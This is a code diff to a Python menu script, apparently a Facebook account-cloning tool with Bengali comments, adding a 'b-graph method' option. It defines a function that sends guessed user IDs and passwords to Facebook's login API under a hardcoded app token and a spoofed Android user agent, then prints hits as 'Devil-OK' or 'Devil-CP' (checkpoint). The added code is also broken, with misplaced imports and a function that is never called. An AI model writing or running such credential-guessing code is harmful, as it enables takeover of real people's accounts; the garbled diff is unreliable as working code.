@@ -203,4 +203,54 @@ if choice in ["3", "4", "৩", "৪", "8", "৮"]:
 # -------------------------------------------------------------
 if choice in ["5", "৫"]:
     os.system('clear')
-    print("--- [5] Random Clone (b-graph Method
+    
+    import requests
+import uuid
+import json
+
+def b_graph_method(uid, password):
+    r = requests.Session()
+    
+    head = {
+        'Host': 'b-graph.facebook.com',
+        'X-Fb-Connection-Type': 'WIFI',
+        'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', # সাধারণত একটি ডিফল্ট টোকেন লাগে
+        'User-Agent': 'Dalvik/2.1.0 (Linux; U; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002) [FBAN/MessengerLite;FBAV/275.0.0.12.119;FBPN/com.facebook.mlite;FBLC/en_US;FBBV/273616641;]'
+    }
+    
+    data = {
+        'adid': str(uuid.uuid4()),
+        'format': 'json',
+        'device_id': str(uuid.uuid4()),
+        'email': uid,
+        'password': password,
+        'generate_analytics_claim': '1',
+        'credentials_type': 'password',
+        'source': 'login',
+        'error_detail_type': 'button_with_disabled',
+        'enroll_ext_attrib': '0',
+        'generate_session_cookies': '1',
+        'generate_machine_id': '1',
+        'meta_inf_fbmeta': '',
+    }
+    
+    try:
+        pos = r.post('https://b-graph.facebook.com/auth/login', data=data, headers=head).json()
+        
+        if 'session_key' in pos or 'access_token' in pos:
+            print(f"\n[Devil-OK] {uid} | {password}")
+        elif 'www.facebook.com' in pos.get('error', {}).get('message', ''):
+            print(f"\n[Devil-CP] {uid} | {password}")
+        else:
+            pass
+    except:
+        print("\n[X] Network Error!")
+       
+        # -------------------------------------------------------------
+# METHOD 6: EXIT
+# -------------------------------------------------------------
+if choice in ["6", "৬"]:
+    print("\n[+] Thank you for using this tool! Goodbye.")
+    exit()
+
+input("\nPress Enter to Exit...")
